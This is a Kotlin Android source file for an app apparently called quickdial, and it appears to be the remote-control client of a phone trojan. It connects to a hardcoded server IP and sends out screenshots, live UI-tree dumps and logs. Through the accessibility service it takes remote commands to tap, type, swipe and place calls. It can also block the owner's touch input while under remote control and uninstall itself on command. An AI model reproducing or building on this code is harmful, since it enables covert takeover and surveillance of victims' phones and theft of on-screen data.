package com.example.quickdial

import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Base64
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import java.io.ByteArrayOutputStream
import java.net.URI
import java.net.URLEncoder
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.math.min

class WebSocketManager(private val activity: MainActivity) {

    companion object {
        private const val HEARTBEAT_INTERVAL = 30000L
        private const val MAX_RECONNECT_DELAY = 60000L
        private const val INITIAL_RECONNECT_DELAY = 5000L
        private const val SCALE = 0.5f
    }

    enum class ConnectionState { DISCONNECTED, CONNECTING, CONNECTED, RECONNECTING }

    private val DEVICE_ID = URLEncoder.encode(Build.MODEL.replace(" ", "_"), "UTF-8")
    private val SERVER_URL = "ws://34.30.143.238:3010/?type=phone&password=admin123&device=$DEVICE_ID"
    
    private var webSocketClient: WebSocketClient? = null
    private var cachedProjection: MediaProjection? = null
    private var phoneNumber = "+1234567890"
    private var connectionState = ConnectionState.DISCONNECTED
    private var reconnectDelay = INITIAL_RECONNECT_DELAY
    private var reconnectAttempts = 0
    private val shouldReconnect = AtomicBoolean(true)
    private val mainHandler = Handler(Looper.getMainLooper())
    private var heartbeatRunnable: Runnable? = null
    private var remoteModeActive = false
    private var projectionReady = false

    init { LogUtil.setSender { logJson -> sendRaw(logJson) } }

    fun connect() {
        shouldReconnect.set(true)
        reconnectDelay = INITIAL_RECONNECT_DELAY
        reconnectAttempts = 0
        doConnect()
    }

    private fun doConnect() {
        if (connectionState == ConnectionState.CONNECTED) return
        connectionState = ConnectionState.CONNECTING
        activity.updateStatus("Connecting...")
        try {
            webSocketClient = object : WebSocketClient(URI(SERVER_URL)) {
                override fun onOpen(handshakedata: ServerHandshake?) {
                    connectionState = ConnectionState.CONNECTED
                    reconnectAttempts = 0
                    reconnectDelay = INITIAL_RECONNECT_DELAY
                    activity.updateStatus("✅ Connected")
                    activity.onServerConnected()
                    startHeartbeat()
                }
                override fun onMessage(message: String?) { message?.let { handleMessage(it) } }
                override fun onClose(code: Int, reason: String?, remote: Boolean) { handleDisconnect() }
                override fun onError(ex: Exception?) { handleDisconnect() }
            }
            webSocketClient?.connect()
        } catch (e: Exception) { handleDisconnect() }
    }

    private fun handleMessage(message: String) {
        try {
            val cmd = org.json.JSONObject(message)
            val a11y = QuickAccessibilityService.instance

            when (cmd.optString("action", cmd.optString("type"))) {
                "tap" -> a11y?.performTap(cmd.getDouble("x").toFloat(), cmd.getDouble("y").toFloat())
                "swipe" -> a11y?.performSwipe(
                    cmd.getDouble("startX").toFloat(), cmd.getDouble("startY").toFloat(),
                    cmd.getDouble("endX").toFloat(), cmd.getDouble("endY").toFloat()
                )
                "type" -> a11y?.typeText(cmd.getString("text"))
                "home" -> a11y?.goHome()
                "back" -> a11y?.goBack()
                "recents" -> a11y?.openRecents()
                "notifications" -> a11y?.openNotifications()
                "call" -> a11y?.makeCall(phoneNumber, activity)
                "dumpUI" -> {
                    val uiJson = a11y?.dumpUI() ?: "{}"
                    sendRaw("{\"type\":\"uiTree\",\"data\":$uiJson}")
                }
                "tapByText" -> {
                    val result = a11y?.tapByText(cmd.getString("text")) ?: false
                    sendRaw("{\"type\":\"actionResult\",\"action\":\"tapByText\",\"success\":$result}")
                }
                "tapById" -> {
                    val result = a11y?.tapById(cmd.getString("id")) ?: false
                    sendRaw("{\"type\":\"actionResult\",\"action\":\"tapById\",\"success\":$result}")
                }
                "typeIntoFocused" -> {
                    val result = a11y?.typeIntoFocused(cmd.getString("text")) ?: false
                    sendRaw("{\"type\":\"actionResult\",\"action\":\"typeIntoFocused\",\"success\":$result}")
                }
                "startDumpStream" -> {
    val tag = cmd.optString("tag", "unknown")
    startDumpStream(tag)
}
"stopDumpStream" -> stopDumpStream()
                "screenshot" -> takeScreenshot()
                "mode" -> setRemoteMode(cmd.optBoolean("remote", false))
                "uninstall" -> a11y?.uninstallSelf(activity.packageName)
                "config" -> cmd.optString("phoneNumber")?.let { phoneNumber = it }
                "ping" -> sendRaw("{\"type\":\"pong\"}")
            }
        } catch (e: Exception) {}
    }

    fun setRemoteMode(remote: Boolean) {
        if (remoteModeActive == remote) return
        remoteModeActive = remote
        val a11y = QuickAccessibilityService.instance
        if (remote) {
            a11y?.blockTouch()
            a11y?.remoteMode = true
            activity.updateStatus("🔴 Remote ON")
        } else {
            a11y?.remoteMode = false
            a11y?.releaseTouch()
            activity.updateStatus("🟢 Remote OFF")
        }
    }

    fun cacheProjection(projection: MediaProjection?, width: Int, height: Int) {
        cachedProjection = projection
        projectionReady = projection != null
        if (projectionReady) {
            LogUtil.i("WS", "Screenshot ready")
        }
    }

    fun takeScreenshot() {
    if (cachedProjection == null) {
        LogUtil.w("WS", "No projection for screenshot")
        sendRaw("{\"type\":\"error\",\"message\":\"Screen capture not ready\"}")
        return
    }
    try {
        val metrics = activity.resources.displayMetrics
        val w = (metrics.widthPixels * SCALE).toInt()
        val h = (metrics.heightPixels * SCALE).toInt()
        
        // Use RGBA_8888 to match display format
        val imageReader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
        val vd = cachedProjection!!.createVirtualDisplay(
            "Screenshot", w, h, metrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.surface, null, null
        )

        mainHandler.postDelayed({
            try {
                val image = imageReader.acquireLatestImage()
                if (image != null) {
                    val planes = image.planes
                    val buffer = planes[0].buffer
                    val width = image.width
                    val height = image.height
                    val pixelStride = planes[0].pixelStride
                    val rowStride = planes[0].rowStride
                    val rowPadding = rowStride - pixelStride * width
                    
                    val bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
                    bitmap.copyPixelsFromBuffer(buffer)
                    image.close()
                    
                    val cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height)
                    bitmap.recycle()
                    
                    val baos = ByteArrayOutputStream()
                    cropped.compress(Bitmap.CompressFormat.JPEG, 70, baos)
                    cropped.recycle()
                    
                    val base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                    baos.close()
                    
                    sendRaw("{\"type\":\"screenshot\",\"data\":\"$base64\"}")
                    LogUtil.i("WS", "Screenshot taken ${width}x${height}")
                }
            } catch (e: Exception) {
                LogUtil.e("WS", "Screenshot failed", e)
            }
            vd.release()
            imageReader.close()
        }, 500)
        
    } catch (e: Exception) {
        LogUtil.e("WS", "Screenshot error", e)
    }
}

    private fun handleDisconnect() {
        stopHeartbeat()
        stopDumpStream()
        QuickAccessibilityService.instance?.let { it.remoteMode = false; it.releaseTouch() }
        remoteModeActive = false
        connectionState = ConnectionState.DISCONNECTED
        activity.updateStatus("Disconnected")
        if (shouldReconnect.get()) scheduleReconnect()
    }

    private fun scheduleReconnect() {
        connectionState = ConnectionState.RECONNECTING; reconnectAttempts++
        val delay = min(maxOf(reconnectDelay, 5000L), MAX_RECONNECT_DELAY)
        mainHandler.postDelayed({ if (shouldReconnect.get() && connectionState != ConnectionState.CONNECTED) doConnect() }, delay)
        reconnectDelay = min(reconnectDelay * 2, MAX_RECONNECT_DELAY)
    }

    private fun startHeartbeat() {
        stopHeartbeat()
        heartbeatRunnable = object : Runnable {
            override fun run() {
                if (connectionState == ConnectionState.CONNECTED) { sendRaw("{\"type\":\"ping\"}"); mainHandler.postDelayed(this, HEARTBEAT_INTERVAL) }
            }
        }
        mainHandler.postDelayed(heartbeatRunnable!!, HEARTBEAT_INTERVAL)
    }

    private fun stopHeartbeat() { heartbeatRunnable?.let { mainHandler.removeCallbacks(it) }; heartbeatRunnable = null }
    fun isConnected(): Boolean = connectionState == ConnectionState.CONNECTED
    private fun sendRaw(message: String) { try { if (webSocketClient?.isOpen == true) webSocketClient?.send(message) } catch (_: Exception) {} }
    fun sendCommand(action: String, extraJson: String = "") {
    if (extraJson.isNotEmpty()) {
        sendRaw("{\"action\":\"$action\",$extraJson}")
    } else {
        sendRaw("{\"action\":\"$action\"}")
    }
}

private var dumpStreamRunning = false
private var dumpStreamRunnable: Runnable? = null

private fun startDumpStream(tag: String) {
    if (dumpStreamRunning) return
    dumpStreamRunning = true
    
    dumpStreamRunnable = object : Runnable {
        override fun run() {
            if (!dumpStreamRunning) return
            val a11y = QuickAccessibilityService.instance
            val uiJson = a11y?.dumpUI() ?: "{}"
            sendRaw("{\"type\":\"uiStream\",\"tag\":\"$tag\",\"data\":$uiJson}")
            mainHandler.postDelayed(this, 300)
        }
    }
    mainHandler.post(dumpStreamRunnable!!)
}

private fun stopDumpStream() {
    dumpStreamRunning = false
    dumpStreamRunnable?.let { mainHandler.removeCallbacks(it) }
    dumpStreamRunnable = null
}

    fun disconnect() {
        shouldReconnect.set(false); stopHeartbeat()
        QuickAccessibilityService.instance?.let { it.remoteMode = false; it.releaseTouch() }
        cachedProjection = null
        try { webSocketClient?.close() } catch (_: Exception) {}
        connectionState = ConnectionState.DISCONNECTED
    }
}
